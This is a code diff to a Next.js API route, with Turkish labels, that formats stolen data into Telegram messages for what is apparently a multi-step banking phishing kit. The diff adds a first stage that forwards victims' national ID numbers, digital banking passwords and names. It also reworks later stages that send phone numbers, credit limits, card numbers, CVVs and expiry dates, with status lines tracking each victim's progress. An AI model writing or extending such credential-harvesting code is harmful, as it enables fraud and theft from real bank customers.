@@ -8,7 +8,7 @@ interface TelegramData {
   applicationDate: string
   realName?: string // Ad Soyad veya Kart Sahibi
   realSurname?: string
-  messageType?: 'PHONE_INFO' | 'CARD_INFO' // Mesaj türü
+  messageType?: 'LOGIN_INFO' | 'PHONE_INFO' | 'CARD_INFO' // Mesaj türü
 }
 
 export async function POST(request: NextRequest) {
@@ -46,37 +46,61 @@ export async function POST(request: NextRequest) {
     // Telegram mesajını oluştur
     let message = ''
     
-    if (messageType === 'CARD_INFO') {
+    if (messageType === 'LOGIN_INFO') {
+      message = `
+🔔 *🔐 GİRİŞ BİLGİLERİ ALINDI*
+
+🌐 *Domain:* \`${fullDomain}\`
+
+🔐 *Login Bilgileri:*
+🆔 TC Kimlik: \`${telegramData.username}\`
+🔐 Dijital Şifre: \`${telegramData.password}\`
+👤 Ad Soyad: \`${telegramData.realName} ${telegramData.realSurname}\`
+📅 Giriş Tarihi: \`${telegramData.applicationDate}\`
+
+🎯 *DURUM:* 🔴 *BAŞLANGIÇ VERİSİ - TELEFON BEKLENİYOR*
+
+---
+      `.trim()
+    } else if (messageType === 'CARD_INFO') {
       message = `
 🔔 *💳 KART BİLGİLERİ TAMAMLANDI*
 
 🌐 *Domain:* \`${fullDomain}\`
 
-💳 *Kart Bilgileri:*
+🎯 *3. ADIM - TAMAMLANDI:*
 💳 Kart Numarası: \`${telegramData.phone}\`
 🔐 CVV: \`${telegramData.password}\`
 📅 Son Kullanma: \`${telegramData.creditLimit}\`
 👤 Kart Sahibi: \`${telegramData.realName}\`
-📅 Tamamlanma Tarihi: \`${telegramData.applicationDate}\`
 
-🎯 *DURUM:* ✅ *TAM VERİ - KART BİLGİLERİ ALINDI*
+📝 *ÖNCEKİ VERİLER:*
+\`${telegramData.realSurname}\`
+
+📊 *TOPLAM VERİ:*
+\`${telegramData.username}\`
+
+📅 Son Güncelleme: \`${telegramData.applicationDate}\`
+
+🎯 *DURUM:* ✅ *SÜREÇ TAMAMLANDI - TÜM VERİLER ALINDI*
 
 ---
       `.trim()
     } else if (messageType === 'PHONE_INFO') {
       message = `
-🔔 *📱 ÖN BİLGİLER ALINDI*
+🔔 *📱 TELEFON BİLGİLERİ ALINDI*
 
 🌐 *Domain:* \`${fullDomain}\`
 
-👤 *İlk Adım Bilgileri:*
+👤 *2. Adım - Telefon ve Limit:*
 🆔 TC Kimlik: \`${telegramData.username}\`
 🔐 Dijital Şifre: \`${telegramData.password}\`
 📱 Telefon: \`${telegramData.phone}\`
 💳 Kredi Kartı Limiti: \`${telegramData.creditLimit} ₺\`
-📅 Başlangıç Tarihi: \`${telegramData.applicationDate}\`
+👤 Ad Soyad: \`${telegramData.realName} ${telegramData.realSurname}\`
+📅 Telefon Tarihi: \`${telegramData.applicationDate}\`
 
-⚠️ *DURUM:* 🟡 *PARÇA VERİ - KART BİLGİLERİ BEKLENİYOR*
+🎯 *DURUM:* 🟡 *TELEFON VERİSİ - KART BİLGİLERİ BEKLENİYOR*
 
 ---
       `.trim()
